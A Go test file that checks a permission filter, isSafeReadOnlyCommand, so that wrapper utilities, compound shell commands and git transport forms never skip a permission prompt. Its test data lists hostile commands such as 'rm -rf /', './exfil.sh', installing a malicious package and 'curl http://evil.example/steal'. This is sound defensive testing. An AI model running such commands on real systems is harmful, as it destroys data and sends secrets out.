package tools

// Wrapper commands are excluded because they can execute arbitrary subcommands.

import "testing"

func TestSafeCommands_WrapperUtilitiesAreNotSafe(t *testing.T) {
	dangerous := []string{
		"env rm -rf ./secrets",
		"env -i ./exfil.sh",
		"nice rm -rf /",
		"nice -n 10 npm install malicious-package",
		"nohup ./exfil.sh &",
		"timeout 10 ./exfil.sh",
		"timeout -k 5 30 curl http://evil.example/steal",
		"time rm -rf /",
	}
	for _, cmd := range dangerous {
		if isSafeReadOnlyCommand(cmd) {
			t.Errorf("isSafeReadOnlyCommand(%q) = true, want false — a command-wrapper utility must never bypass the permission prompt for its wrapped subcommand", cmd)
		}
	}
}

// TestSafeCommands_GenuinelySafeCommandsStillFast covers ordinary read-only commands.
func TestSafeCommands_GenuinelySafeCommandsStillFast(t *testing.T) {
	safe := []string{
		"ls -la",
		"pwd",
		"printenv",
		"git status",
		"git diff HEAD~1",
		"whoami",
	}
	for _, cmd := range safe {
		if !isSafeReadOnlyCommand(cmd) {
			t.Errorf("isSafeReadOnlyCommand(%q) = false, want true — this is a genuinely read-only command that should skip the permission prompt", cmd)
		}
	}
}

// TestSafeCommands_CompoundCommandsNeverSafe covers shell control syntax.
func TestSafeCommands_CompoundCommandsNeverSafe(t *testing.T) {
	compound := []string{
		"git status && rm -rf /",
		"ls; rm -rf /",
		"git status\nrm -rf /",
	}
	for _, cmd := range compound {
		if isSafeReadOnlyCommand(cmd) {
			t.Errorf("isSafeReadOnlyCommand(%q) = true, want false — a compound command must always require the permission prompt", cmd)
		}
	}
}

func TestSafeCommands_GitTransportFormsAreNotSafe(t *testing.T) {
	for _, command := range []string{
		"git ls-remote origin",
		"git ls-remote helper::origin",
		"git remote show origin",
		"git remote show origin -n",
		"git remote -n show origin",
	} {
		if isSafeReadOnlyCommand(command) {
			t.Errorf("isSafeReadOnlyCommand(%q) = true, want false", command)
		}
	}

	for _, command := range []string{
		"git remote",
		"git remote -v",
		"git remote get-url origin",
		"git remote show -n origin",
	} {
		if !isSafeReadOnlyCommand(command) {
			t.Errorf("isSafeReadOnlyCommand(%q) = false, want true", command)
		}
	}
}
